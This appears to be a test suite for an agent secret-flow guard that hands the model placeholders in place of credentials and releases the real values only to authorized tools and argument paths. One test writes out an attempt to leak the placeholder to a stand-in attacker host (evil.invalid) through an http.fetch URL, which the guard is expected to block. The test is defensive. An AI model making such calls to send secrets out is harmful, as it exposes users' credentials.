import assert from 'node:assert/strict';
import test from 'node:test';

import {
  AgentFlowBlockedError,
  AgentFlowLimitError,
  createAgentFlow,
} from '../dist/agent.js';

const tokenPattern = /^\[FR_FLOW_[a-f0-9]{32}\]$/;

function databaseFlow(overrides = {}) {
  return createAgentFlow({
    policy: { terms: ['db-secret', 'tenant-secret'] },
    sinks: {
      'postgres.execute': {
        capabilities: [{
          id: 'database-credential',
          sources: ['config'],
          detectors: ['custom_term'],
          paths: ['/args/connectionString'],
        }],
      },
      'http.fetch': { capabilities: [] },
    },
    ...overrides,
  });
}

test('restores an authorized source, detector, sink and destination path', () => {
  const flow = databaseFlow();
  const safe = flow.protectForModel('config', { value: 'db-secret' });

  assert.match(safe.value, tokenPattern);
  const call = flow.authorizeForSink('postgres.execute', {
    args: { connectionString: safe.value, query: 'select 1' },
  });

  assert.equal(call.args.connectionString, 'db-secret');
  assert.equal(call.args.query, 'select 1');
  assert.deepEqual(flow.snapshot().sinks['postgres.execute'], {
    uses: 1,
    uniqueValues: 1,
    bytes: 9,
  });
});

test('blocks cross-sink placeholder transplantation', () => {
  const flow = databaseFlow();
  const safe = flow.protectForModel('config', 'db-secret');

  assert.throws(
    () => flow.authorizeForSink('http.fetch', { args: { url: `https://evil.invalid/?x=${safe}` } }),
    (error) => {
      assert(error instanceof AgentFlowBlockedError);
      assert.equal(error.decision.violations[0].reason, 'capability_denied');
      assert.equal(error.decision.violations[0].path, '/args/url');
      return true;
    },
  );
});

test('blocks the right sink when the placeholder is moved to the wrong argument path', () => {
  const flow = databaseFlow();
  const safe = flow.protectForModel('config', 'db-secret');

  assert.throws(
    () => flow.authorizeForSink('postgres.execute', { args: { callbackUrl: safe } }),
    (error) => {
      assert(error instanceof AgentFlowBlockedError);
      assert.equal(error.decision.violations[0].reason, 'capability_denied');
      assert.equal(error.decision.violations[0].path, '/args/callbackUrl');
      return true;
    },
  );
});

test('does not consume capability budget when any occurrence fails preflight', () => {
  const flow = createAgentFlow({
    policy: { terms: ['db-secret'] },
    sinks: {
      'postgres.execute': {
        capabilities: [{
          id: 'single-use-database-credential',
          sources: ['config'],
          paths: ['/args/connectionString'],
          maxUses: 1,
        }],
      },
    },
  });
  const safe = flow.protectForModel('config', 'db-secret');

  assert.throws(() => flow.authorizeForSink('postgres.execute', {
    args: { connectionString: safe, callbackUrl: safe },
  }), AgentFlowBlockedError);

  assert.equal(
    flow.authorizeForSink('postgres.execute', { args: { connectionString: safe } }).args.connectionString,
    'db-secret',
  );
  assert.throws(
    () => flow.authorizeForSink('postgres.execute', { args: { connectionString: safe } }),
    (error) => error instanceof AgentFlowBlockedError
      && error.decision.violations[0].reason === 'capability_budget_exceeded',
  );
});

test('enforces cumulative use, unique-value and UTF-8 byte budgets across turns', () => {
  const flow = createAgentFlow({
    policy: { terms: ['db-secret', 'tenant-secret'] },
    sinks: {
      'analytics.write': {
        capabilities: [{ id: 'approved-fields', sources: '*', paths: ['/value'] }],
        budget: { maxUses: 3, maxUniqueValues: 1, maxBytes: 27 },
      },
    },
  });
  const first = flow.protectForModel('config', 'db-secret');
  const second = flow.protectForModel('tenant', 'tenant-secret');

  flow.authorizeForSink('analytics.write', { value: first });
  flow.authorizeForSink('analytics.write', { value: first });
  flow.authorizeForSink('analytics.write', { value: first });

  assert.throws(
    () => flow.authorizeForSink('analytics.write', { value: first }),
    (error) => error instanceof AgentFlowBlockedError
      && error.decision.violations.some((violation) => violation.limit === 'maxUses'),
  );
  assert.throws(
    () => flow.authorizeForSink('analytics.write', { value: second }),
    (error) => error instanceof AgentFlowBlockedError
      && error.decision.violations.some((violation) => violation.limit === 'maxUniqueValues'),
  );
});

test('blocks forged, foreign-session and key-position placeholders', () => {
  const flow = createAgentFlow({
    policy: { terms: ['db-secret'] },
    sinks: {
      trusted: { capabilities: [{ id: 'all-values', sources: '*', paths: ['/**'] }] },
    },
  });
  const other = createAgentFlow({ policy: { terms: ['db-secret'] } });
  const local = flow.protectForModel('config', 'db-secret');
  const foreign = other.protectForModel('config', 'db-secret');
  const forged = `[FR_FLOW_${'a'.repeat(32)}]`;

  assert.throws(() => flow.authorizeForSink('trusted', { value: foreign }), AgentFlowBlockedError);
  assert.throws(() => flow.authorizeForSink('trusted', { value: forged }), AgentFlowBlockedError);
  assert.throws(
    () => flow.authorizeForSink('trusted', { [local]: 'value' }),
    (error) => error instanceof AgentFlowBlockedError
      && error.decision.violations[0].reason === 'key_position',
  );
  const audit = JSON.stringify(flow.snapshot());
  assert.equal(audit.includes(local), false);
  assert.match(audit, /<object-key:0>/);
});

test('supports recursive path capabilities and preserves cyclic/shared graphs', () => {
  const flow = createAgentFlow({
    policy: { terms: ['db-secret'] },
    sinks: {
      trusted: { capabilities: [{ id: 'nested-args', sources: '*', paths: ['/args/**'] }] },
    },
  });
  const shared = { value: 'db-secret' };
  const source = { left: shared, right: shared };
  source.self = source;

  const safe = flow.protectForModel('config', source);
  assert.equal(safe.left, safe.right);
  assert.equal(safe.self, safe);

  const call = { args: { payload: safe } };
  call.self = call;
  const restored = flow.authorizeForSink('trusted', call);
  assert.equal(restored.self, restored);
  assert.equal(restored.args.payload.left, restored.args.payload.right);
  assert.equal(restored.args.payload.left.value, 'db-secret');
});

test('expires and revokes mappings fail closed', () => {
  let time = 100;
  const flow = createAgentFlow({
    now: () => time,
    limits: { tokenTtlMs: 10 },
    policy: { terms: ['db-secret'] },
    sinks: {
      trusted: { capabilities: [{ id: 'root', sources: '*', paths: [''] }] },
    },
  });
  const expired = flow.protectForModel('config', 'db-secret');
  time = 110;
  assert.throws(() => flow.authorizeForSink('trusted', expired), AgentFlowBlockedError);

  time = 120;
  const revoked = flow.protectForModel('config', 'db-secret');
  assert.equal(flow.revokeSource('config'), 1);
  assert.throws(() => flow.authorizeForSink('trusted', revoked), AgentFlowBlockedError);
});

test('keeps audit snapshots value-free and bounded', () => {
  const observed = [];
  const flow = createAgentFlow({
    policy: { terms: ['db-secret'] },
    limits: { maxEvents: 2 },
    onEvent: (event) => observed.push(event),
    sinks: {
      trusted: { capabilities: [{ id: 'root', sources: '*', paths: [''] }] },
      denied: { capabilities: [] },
    },
  });
  const safe = flow.protectForModel('config', 'db-secret');
  flow.authorizeForSink('trusted', safe);
  assert.throws(() => flow.authorizeForSink('denied', safe), AgentFlowBlockedError);

  const serialised = JSON.stringify(flow.snapshot());
  assert.equal(flow.snapshot().events.length, 2);
  assert.equal(observed.length, 3);
  assert.equal(serialised.includes('db-secret'), false);
  assert.equal(serialised.includes(safe), false);
});

test('fails closed without consuming authorization when the audit sink fails', () => {
  let rejectAudit = false;
  const flow = createAgentFlow({
    policy: { terms: ['db-secret'] },
    onEvent(event) {
      if (rejectAudit && event.type === 'authorized') throw new Error('audit unavailable');
    },
    sinks: {
      trusted: {
        capabilities: [{ id: 'single-use', sources: '*', paths: [''], maxUses: 1 }],
      },
    },
  });
  const safe = flow.protectForModel('config', 'db-secret');

  rejectAudit = true;
  assert.throws(() => flow.authorizeForSink('trusted', safe), /audit unavailable/);
  assert.deepEqual(flow.snapshot().sinks.trusted, { uses: 0, uniqueValues: 0, bytes: 0 });

  rejectAudit = false;
  assert.equal(flow.authorizeForSink('trusted', safe), 'db-secret');
});

test('rejects re-entrant flow operations from audit callbacks', () => {
  let checked = false;
  let flow;
  flow = createAgentFlow({
    policy: { terms: ['db-secret'] },
    onEvent(event) {
      if (event.type !== 'protected') return;
      checked = true;
      assert.throws(
        () => flow.inspectForSink('trusted', { value: 'unchanged' }),
        /must not run re-entrantly during protectForModel/,
      );
    },
  });

  assert.match(flow.protectForModel('config', 'db-secret'), tokenPattern);
  assert.equal(checked, true);
});

test('keeps revoke and reset state unchanged when their audit delivery fails', () => {
  let rejectRevocation = false;
  const flow = databaseFlow({
    onEvent(event) {
      if (rejectRevocation && event.type === 'revoked') throw new Error('audit unavailable');
    },
  });
  const safe = flow.protectForModel('config', 'db-secret');
  flow.authorizeForSink('postgres.execute', { args: { connectionString: safe } });

  rejectRevocation = true;
  assert.throws(() => flow.revokeSource('config'), /audit unavailable/);
  assert.equal(flow.size, 1);
  assert.deepEqual(flow.snapshot().sinks['postgres.execute'], { uses: 1, uniqueValues: 1, bytes: 9 });
  assert.throws(() => flow.reset(), /audit unavailable/);
  assert.equal(flow.size, 1);

  rejectRevocation = false;
  flow.reset();
  const snapshot = flow.snapshot();
  assert.equal(snapshot.liveMappings, 0);
  assert.deepEqual(snapshot.sinks['postgres.execute'], { uses: 0, uniqueValues: 0, bytes: 0 });
  assert.equal(snapshot.events.length, 1);
  assert.equal(snapshot.events[0].type, 'revoked');
});

test('passes token-free calls through without cloning or requiring a sink policy', () => {
  const flow = databaseFlow();
  const call = { args: { query: 'select 1' } };
  assert.equal(flow.authorizeForSink('unconfigured.tool', call), call);
  assert.equal(flow.inspectForSink('unconfigured.tool', call).allowed, true);
});

test('rolls back a partially minted source transaction when the mapping limit is hit', () => {
  const flow = createAgentFlow({
    limits: { maxMappings: 1 },
    policy: { terms: ['db-secret', 'tenant-secret'] },
  });

  assert.throws(
    () => flow.protectForModel('config', ['db-secret', 'tenant-secret']),
    AgentFlowLimitError,
  );
  assert.equal(flow.size, 0);
});

test('rolls back newly minted mappings when protected-event auditing fails', () => {
  const flow = createAgentFlow({
    policy: { terms: ['db-secret'] },
    onEvent(event) {
      if (event.type === 'protected') throw new Error('audit unavailable');
    },
  });

  assert.throws(() => flow.protectForModel('config', 'db-secret'), /audit unavailable/);
  assert.equal(flow.size, 0);
  assert.equal(flow.snapshot().events.length, 0);
});

test('validates runtime-owned capabilities before processing model data', () => {
  assert.throws(
    () => createAgentFlow({
      sinks: {
        trusted: {
          capabilities: [{ id: 'bad-path', sources: '*', paths: ['/args/**/secret'] }],
        },
      },
    }),
    /final segment/,
  );
  assert.throws(() => databaseFlow().protectForModel('../model-controlled', 'db-secret'), /Source id/);
});
